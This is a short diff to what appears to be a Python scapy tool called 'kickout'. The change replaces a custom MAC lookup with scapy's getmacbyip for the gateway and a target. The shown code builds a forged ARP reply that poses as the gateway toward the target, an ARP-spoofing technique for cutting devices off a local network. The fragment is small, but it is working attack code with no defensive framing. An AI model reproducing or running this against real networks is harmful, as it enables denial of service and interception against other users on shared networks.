@@ -1,6 +1,5 @@
 from scapy.all import *
 from lib.colors import *
-from arpspoof import mac
 import sys
 import logging
 
@@ -17,8 +16,8 @@ class kickout:
     def __init__(self, tgtIP):
         self.tgtIP = tgtIP
         self.gateIP = gatewayIP()
-        self.gateMAC = mac(self.gateIP)
-        self.tgtMAC = mac(self.tgtIP)
+        self.gateMAC = getmacbyip(self.gateIP)
+        self.tgtMAC = getmacbyip(self.tgtIP)
 
     def kickone(self):
         pkt = ARP(op=2, psrc=self.gateIP, pdst=self.tgtIP, hwdst=self.gateMAC)
